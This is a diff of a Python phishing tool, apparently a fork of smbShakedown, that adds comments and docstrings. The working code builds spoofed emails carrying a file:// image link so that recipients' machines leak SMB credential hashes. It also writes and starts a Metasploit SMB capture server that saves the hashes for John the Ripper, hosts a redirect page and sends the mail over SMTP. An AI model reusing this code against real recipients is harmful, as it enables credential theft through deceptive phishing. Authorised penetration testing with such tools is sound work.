@@ -3,7 +3,7 @@
 Original by Nick Sanzotta:
 https://github.com/NickSanzotta/smbShakedown'''
 try:
-
+    #need to review these
     import SimpleHTTPServer
     from SimpleHTTPServer import SimpleHTTPRequestHandler
 
@@ -28,18 +28,20 @@ try:
 except Exception as e:
     print(str(e))
 
-
 class Smbshakedown(object):
     '''Smbshakedown class object'''
 
     def __init__(self, sender_address, sender_name, smtp_port, recipient_name, \
         smtp_server, smtp_username, verbose, rcpt_header, file, image_server,\
         redirect_url):
-        
+        '''initialize uesr options of sender_address, sender_name, smtp_port, recipient_name, \
+        smtp_server, smtp_username, verbose, rcpt_header, file, image_server,\
+        redirect_url'''
+
         #static rc file location and name
         self.rc_file = './smb_shakedown.rc'
 
-        #user supplied argument options
+        #user supplied argument options, with list object stuff removed
         self.sender_address = ''.join(sender_address)
         self.sender_name = ''.join(sender_name)
         self.smtp_port = int(''.join(smtp_port))
@@ -58,6 +60,7 @@ class Smbshakedown(object):
         self.external_ip = self.get_external_ip().strip('\n')
         self.internal_ip = self.get_internal_address().strip('\n')
 
+        #variable to store http server PID
         self.http_server_pid = None
 
         #sigint and sigterm catch
@@ -69,6 +72,7 @@ class Smbshakedown(object):
 
 
     def get_external_ip(self):
+        '''gets external ip from the system runnng this script by querying ifconfig.co with python-requests'''
         try:
             external_ip = requests.get('http://ifconfig.co', headers = self.requests_useragent).content
             return external_ip
@@ -77,6 +81,7 @@ class Smbshakedown(object):
             sys.exit(1)
 
     def get_internal_address(self):
+        '''uses socket to connec t0 8.8.8.8 on tcp/53 to determine active interface address'''
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         try:
             s.connect(("8.8.8.8", 53))
@@ -85,10 +90,11 @@ class Smbshakedown(object):
         return s.getsockname()[0]
 
     def prompts(self):
+        '''prompts for the smtp server password'''
         self.smtp_password = getpass.getpass(r'Enter SMTP Server password: ')
 
     def validate(self):
-        
+        '''prints user args for validation'''
         print('\nYour settings:\n\n\
 rc file:        {0}\n\
 FROM Address:   {1}\n\
@@ -106,18 +112,16 @@ Recipients:     {9}\n').format(self.rc_file, self.sender_address, self.sender_na
         self.smtp_username, self.verbose, self.rcpt_header, \
         self.recipients_file, self.external_ip, self.image_server_port, \
         self.redirect_url)
-
-        
+        #asks user to confirm and exits if no
         validate_settings = self.yes_no('\nLook OK? (y/n): ')
         if validate_settings is False:
             print('\nGood catch, let\'s try this again\n')
             sys.exit(0)
 
-
     def yes_no(self, answer):
+        '''function to handle yes/no user prompts'''
         yes = set(['yes','y', 'ye', ''])
         no = set(['no','n'])
-         
         while True:
             choice = raw_input(answer).lower()
             if choice in yes:
@@ -127,36 +131,36 @@ Recipients:     {9}\n').format(self.rc_file, self.sender_address, self.sender_na
             else:
                 print ('Please respond with \'yes\' or \'no\'\n')
 
-
     def smb_server(self):
+        '''starts a metasploit smb capture server in a tmux session called msf_shakedown'''
         smb_server_option = self.yes_no('Use a local Metasploit SMB capture server in a screen session called msf_shakedown? (y/n): ')
-        #need to allow a choice of internal or external ip
+        #FEATURE need to allow a choice of internal or external ip?
         if smb_server_option is True:
             rc_config = \
             'use auxiliary/server/capture/smb\n'+\
             'set srvhost {}\n'.format(self.internal_ip)+\
             'set JOHNPWFILE /opt/smbShakedown/smb_hashes\n'+\
             'exploit -j -z'
-        
-
             print('\n{}\n').format(str(rc_config))
-            
+            #prompt user to ok the rc file config
             validate_rc_file = self.yes_no('rc file ready to execute? (y/n): ')
-
+            #if they ok the file
             if validate_rc_file is True:
+                #write the file
                 with open(self.rc_file, 'w') as rc_file:
                     rc_file.writelines(str(rc_config))
                     rc_file.close()
+                #use subprocess to open tmux new session and run msfconsole in it   
                 try:
-                    print('Starting screen...')
+                    print('Starting tmux...')
                     proc = subprocess.Popen(['tmux', 'new-session', '-d', '-s', 'msf_shakedown',\
                      'msfconsole -q -r {}'.format(self.rc_file)], stdout=subprocess.PIPE)
                     (out, err) = proc.communicate()
                     print('Screen sessions: {}'.format(out))
-
                 except Exception as e:
                     print('Error: {}'.format(e))
                     sys.exit(1)
+            #if user opts to not run msfconsole smb capture locallly, provide a sample rc file
             else:
                 print('You\'ll need to provide your own rc file. Here\'s a sample')
                 print('use auxiliary/server/capture/smb\n\
@@ -165,22 +169,23 @@ set JOHNPWFILE /opt/smbShakedown/smb_hashes\n\
 exploit -j -z')
 
     def craft_message_body(self):
-
+        '''generates the html message body with file:\\ link and optional redirect'''
         print('TIP: Domain based link_tags help avoid the "JunkFolder".')
-
+        #if user didnt provide -i <port>, prompt for a location where they are hosting
         if self.image_server_port is None:
             image_server_addr = raw_input('Please enter a FQDN (no http://) or IP where your server is: ')
+        #otherwise, we assume the server is listening at the external ip
+        #ASSUMPTION -- maybe this is bad and there should be an option
         else:
             image_server_addr = self.external_ip
 
-
+        #prompt user for the link name
         link_tag_name = raw_input('Enter text for link_tag to be displayed[CLICK ME!]: ') or 'Click here'
+        
+        #generate link
+        link_tag = '<a href="http://{}:{}" target="_blank">{}'.format(image_server_addr,self.image_server_port,link_tag_name)+'</a>'
 
-        link_tag = '<a href="http://{}:{}" target="_blank">{}'.format(image_server_addr,self.image_server_port,link_tag_name)+'</a>' 
-
- 
-        ### EDIT: Email Message Template Below ###
-
+        #message template, populated with from name/addr to name/addr, link generated in link_tag, and the msgbody
         message = """From: {0} <{1}>
 To: {2} <{3}>
 MIME-Version: 1.0
@@ -197,17 +202,14 @@ sincerely,
 <br>
 <img src=file://{4}/image/sig.jpg height="100" width="150"></a>
 """
-        ##########################################################
-        
+        #create email_message object with all the goodies in it
         email_message = message.format(self.sender_name, self.sender_address, \
             self.recipient_name, self.rcpt_header, image_server_addr, link_tag)
-
         print('Email message: \n {}'.format(email_message))
-
         return email_message
                 
-
     def write_file(self, content, filename):
+        '''generic file writer function'''
         try:
             with open(filename, 'w') as file:
                 file.writelines(content)
@@ -217,6 +219,7 @@ sincerely,
             sys.exit(1)
 
     def read_file(self, filename):
+        '''generic file reader function'''
         try:
             with open(filename, 'r') as file:
                 content = file.read()
@@ -227,6 +230,8 @@ sincerely,
             sys.exit(1)
 
     def craft_http_content(self):
+        '''creates an html page to be hosted by the local http server'''
+        #html template populated with redirect url and file:// url
         html = """<!DOCTYPE HTML>
 <html lang="en-US">
     <head>
@@ -245,9 +250,11 @@ sincerely,
 """.format(self.external_ip, self.redirect_url)
         print('\nHTML Hosted:\n{}'.format(html))
 
+        #writes out as index.hml in this directory
         self.write_file(html, './index.html')
 
     def exit_gracefully(self, signal, frame):
+        '''function to catch ctrl-c'''
         print('\nCaught Ctrl+C')
         if self.http_server_pid is not None:
             try:
@@ -255,12 +262,12 @@ sincerely,
                 os.kill(int(self.http_server_pid),9)
             except Exception as e:
                 print(e)
-
+        #check for and list any running tmux sessions
+        #FEATURE: should just list and attempt to close automatically instead of having user do it
         print('Check remaining tmux sessions')
         proc = subprocess.Popen(["tmux","ls"], stdout=subprocess.PIPE)
         (out, err) = proc.communicate()
         print('Tmux sessions: {}'.format(out))
-
         sys.exit(1)
 
     def run_http_server(self):
@@ -268,74 +275,73 @@ sincerely,
         #maybe just use subprocess.Popen to run simple server?
         if self.image_server_port is not None:
             print('Starting local http server on tcp/{}'.format(str(self.image_server_port)))
-
+            #listens on 0.0.0.0 on port supplied with -i
             addr = ("0.0.0.0", self.image_server_port)
             
+            #starts simplehttpserver as handler
             Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
-            
-            
+            #starts httpd as socked server
             httpd = SocketServer.TCPServer((addr), Handler, bind_and_activate=False)
-            
             httpd.allow_reuse_address = True
             server_process = multiprocessing.Process(target=httpd.serve_forever)
             server_process.daemon = False
             
+            #try to bind and activate or exit
             try:
                 httpd.server_bind()
                 httpd.server_activate()
             except Exception as e:
                 httpd.server_close()
                 print(e)
+            #try to start
             try:
                 server_process.start()
             except Exception as e:
                 print(e)
-
+            #log the http server PID and print it
             self.http_server_pid = server_process.pid
             print('Server running at PID: {}').format(self.http_server_pid)
-
+            #return the PID and tell the user to ctrl-c to stop the madness
             return self.http_server_pid
             print('Hit CTRL-C to stop serving')
 
     def smtp_connection(self):
+        '''method to send the mail via smtp'''
+        #read the recipients file
         recipients = self.read_file(self.recipients_file)
+        #call craft_message_body method and return here
         msg_body = self.craft_message_body()
 
-        '''s = smtplib.SMTP(self.smtp_server, self.smtp_port)
-        s.set_debuglevel(1)
-        msg = MIMEText(msg_body)
-        sender = self.sender_address
-        recipients = recipients
-        msg['Subject'] = "Thank you for all your help."
-        msg['From'] = self.sender_name
-        msg['To'] = ", ".join(recipients)
-        
-        try:
-            s.sendmail(sender, recipients, msg.as_string())
-        except Exception as e:
-            print(e)
-        s.quit()'''
-
+        #smtplib sender
         smtp_server = smtplib.SMTP(self.smtp_server, self.smtp_port)
+        #send ehlo
         smtp_server.ehlo()
+        #starttls
         smtp_server.starttls()
         smtp_server.ehlo
+        #login
         smtp_server.login(self.smtp_username, self.smtp_password)
         print('Testing Connection to your SMTP Server...')
+        #wait 1 second
         time.sleep(1)
+        #query server status
         try:
             status = smtp_server.noop()[0]
             print("SMTP Server Status: ",status)
+            #if status is ok, prompt to send
             send_prompt = self.yes_no("Connection successful, send mail now? (y/n): ")
-
+            #if yes entered, send
             if send_prompt is True:
-                #from addr, to addr, msg
+                #prints from addr, to addr, msg
                 print(self.sender_address, recipients, msg_body)
+                #calls sendmail with from address, recipients and the msg body
                 smtp_server.sendmail(self.sender_address, recipients, msg_body)
                 print("Message(s) sent!")
+                #quit server
                 smtp_server.quit()
 
             else:
+                #if user answered no to successful server status, quit server
                 smtp_server.quit()
                 print("Ok no mail sent.")
 
@@ -343,7 +349,8 @@ sincerely,
             print('Error: {}'.format(e))
 
 def main():
-
+    '''main function'''
+    #accept and parse user args
     parser = argparse.ArgumentParser()
 
     parser.add_argument('-a', '--sender_address', \
@@ -354,7 +361,7 @@ def main():
     parser.add_argument('-c', '--rcpt_header', \
         metavar='<ITsupport@foo.com>', \
         nargs=1, \
-        help='The sender RCPT header address')
+        help='The sender RCPT header address -- corresponds to the spoofed mailing list')
 
     parser.add_argument('-d', '--redirect_url', \
         metavar='<foo.com>',\
@@ -403,7 +410,8 @@ def main():
     args = parser.parse_args()
     args_dict = vars(args)
 
-
+    #check required arguments
+    #FEATURE: need validation for some (valid email, integer port numbers, etc)
     if args.sender_address is None:
         print('No sender address provided')
         sys.exit(0)
@@ -426,6 +434,7 @@ def main():
         print('No recipients file provided')
         sys.exit(0)
 
+    #start smbshakedown class object with supplied arguments
     c1 = Smbshakedown(args.sender_address, \
         args.sender_name, \
         args.smtp_port, \
@@ -438,6 +447,7 @@ def main():
         args.image_server, \
         args.redirect_url)
 
+    #call class methods
     c1.get_external_ip()
     c1.prompts()
     c1.validate()
